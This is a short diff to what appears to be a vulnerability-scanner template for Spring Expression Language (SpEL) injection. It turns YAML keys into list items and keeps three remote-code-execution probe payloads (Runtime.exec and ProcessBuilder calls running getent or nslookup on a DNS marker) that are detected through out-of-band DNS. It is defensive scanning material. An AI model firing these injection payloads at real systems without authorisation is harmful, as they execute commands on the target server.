@@ -1,5 +1,5 @@
 generate:
-  payload:
+  - payload:
     - T(java.lang.Runtime).getRuntime().exec("getent${IFS}DNS_MARKER")
     - "#this.getClass().forName('java.lang.Runtime').getRuntime().exec('getenv${IFS}DNS_MARKER')"
     - new java.lang.ProcessBuilder({'nslookup DNS_MARKER'}).start()
@@ -7,9 +7,9 @@ detect:
   - oob:
     - dns
 meta-info:
-  type: rce
-  threat: 95
-  tags:
+  - type: rce
+  - threat: 95
+  - tags:
     - SpEL injection
     - Spring
     - Spring Framework
